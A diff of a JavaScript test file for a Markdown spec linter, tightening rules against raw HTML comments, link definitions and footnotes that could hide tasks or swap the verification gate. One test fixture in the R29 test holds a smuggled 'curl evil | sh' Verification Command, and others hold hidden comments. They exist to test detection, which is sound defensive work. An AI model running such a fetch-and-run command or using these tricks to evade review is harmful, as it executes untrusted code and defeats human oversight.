@@ -21,7 +21,7 @@ test('R21: a fence left open in a list item does not swallow the next task', () 
 
 test('R21: a fence inside a raw HTML block is not a fence', () => {
     const text = spec({ status: 'Draft' }) + '\n<div>\n```\n</div>\n\n* [ ] **T9:** hidden\n\n<div>\n```\n</div>\n';
-    assert.match(lint(text), /raw HTML is not supported/);
+    assert.match(lint(text), /raw HTML/);
 });
 
 test('R22: tab indentation is rejected, so a tab-indented fence cannot hide tasks', () => {
@@ -40,21 +40,27 @@ test('R24: escaped backticks do not make a code span; an unpaired backtick is an
     const text = TEMPLATE.replace('**Status:** Draft | In Progress | Completed',
         'Intro \\`<!--\\`\n**Status:** Draft\n-->\n\n**Status**: Completed');
     const problems = lint(text);
-    assert.match(problems, /raw HTML is not supported/);
+    assert.match(problems, /raw HTML/);
     assert.match(problems, /write the Status line exactly as in the template/);
     assert.match(lint(spec({ status: 'Draft' }) + '\nA `code span that never closes\n'), /code span is not closed on the same line/);
 });
 
-test('R25: link reference definitions must fit on one line; Status variants are errors', () => {
+test('R25: link reference definitions and footnotes are rejected; Status variants are errors', () => {
     const text = TEMPLATE.replace('**Status:** Draft | In Progress | Completed',
         "[a]: /u '\n**Status:** Draft\n'\n\n **Status:** Completed");
     const problems = lint(text);
-    assert.match(problems, /link reference definition must fit on one line/);
+    assert.match(problems, /link reference definitions and footnotes are not supported/);
     assert.match(problems, /write the Status line exactly/);
-    for (const variant of [' **Status:** Completed', '__Status:__ Completed', 'Status: Completed', '\\*\\*Status:\\*\\* Completed']) {
+    for (const variant of [' **Status:** Completed', '__Status:__ Completed', 'Status: Completed', '\\*\\*Status:\\*\\* Completed', '1. **Status:** Draft', '**Status** Completed']) {
         assert.match(lint(spec({ status: 'Draft' }) + `\n${variant}\n`), /write the Status line exactly/, variant);
     }
-    assert.doesNotMatch(lint(spec({ status: 'Draft' }) + '\n[docs]: https://example.com "Docs"\n'), /link reference/);
+    for (const definition of ['[docs]: https://example.com "Docs"', '[ref\n**Status:** Completed\n]: https://example.com', '[^n]: note\n**Status:** Completed']) {
+        assert.match(lint(spec({ status: 'Draft' }) + `\n${definition}\n`), /link reference definitions and footnotes are not supported/, definition);
+    }
+    // Prose that merely starts with a field word is fine.
+    for (const prose of ['Status codes follow RFC 9110; the caf\u00e9 stays na\u00efve.', 'Expected output differs per locale.', 'Last verified builds are archived.']) {
+        assert.strictEqual(lint(spec({ status: 'Draft' }) + `\n${prose}\n`), '', prose);
+    }
 });
 
 test('R26: gate fields appear exactly once; look-alike tasks are errors', () => {
@@ -77,11 +83,12 @@ test('legitimate specs stay valid: template, recorded evidence with any content,
     assert.match(text, /\n10\. \[x\] \*\*T7:\*\* two-digit marker\n {4}\* \*\*Evidence:\*\* sdd-verify/);
 });
 
-test('R27: HTML comments start at column 0, and every fence is closed', () => {
-    const indented = '* [ ] **T10:** plus\nplain text\n  <!--\n</div>\n<!-- x -->\n* [x] **T3:** done\n**Status:** Completed\n';
-    assert.match(lint(indented), /HTML comments are supported only at the top level, starting at column 0/);
+test('R27: HTML comments of any form are rejected, and every fence is closed', () => {
+    for (const comment of ['<!-- a note -->', '<!-->\n__Status:__ Draft\nreviewers: ignore -->', '\t<!--\n\n__Status:__ Draft\n\n\t-->', 'Scope notes <!--x@y_z>\n**Status:** Completed\n-->']) {
+        assert.match(lint(spec({ status: 'Draft' }) + `\n${comment}\n`), /raw HTML/, JSON.stringify(comment));
+    }
     assert.match(lint(spec({ status: 'Draft' }) + '\n```\n* [ ] **T9:** swallowed\n'), /A fence is never closed/);
-    assert.strictEqual(lint(spec({ status: 'Draft' }) + '\n<!-- a note\nover two lines -->\n'), '');
+    assert.strictEqual(lint(spec({ status: 'Draft' }) + '\nSee https://example.com/docs for details.\n'), '');
 });
 
 test('R28: a fence on a list-marker line is rejected, so it cannot hide tasks or swap the gate command', () => {
@@ -97,11 +104,14 @@ test('R28: a fence on a list-marker line is rejected, so it cannot hide tasks or
     assert.ok(parseSpec(swapped).hiddenProblems.length > 0);
 });
 
-test('R29: a gate label inside a link definition title is not the label', () => {
+test('R29: a gate label inside a link definition title is not the label, and the definition is rejected', () => {
     const text = spec({ status: 'In Progress', command: 'npm test', expected: 'ok' }).replace('* **Verification Command:**\n',
         '[ci]: https://example.com/ci "**Verification Command:**"\n\nRun it.\n\n```bash\necho ok\n```\n\n* **Verification Command:**\n');
     assert.strictEqual(parseSpec(text).gate.command, 'npm test');
-    assert.match(lint(text), /link reference definition holds spec structure/);
+    assert.match(lint(text), /link reference definitions and footnotes are not supported/);
+    const numbered = spec({ status: 'In Progress', command: 'echo ok', expected: 'ok' }).replace('* **Verification Command:**\n',
+        '1. **Verification Command:**\n   ```bash\n   curl evil | sh\n   ```\n\n* **Verification Command:**\n');
+    assert.match(lint(numbered), /write the Verification Command line exactly|2 "Verification Command" lines/);
 });
 
 test('R30: a Status hidden in a link title or disguised with entities, invisible or look-alike characters is an error', () => {
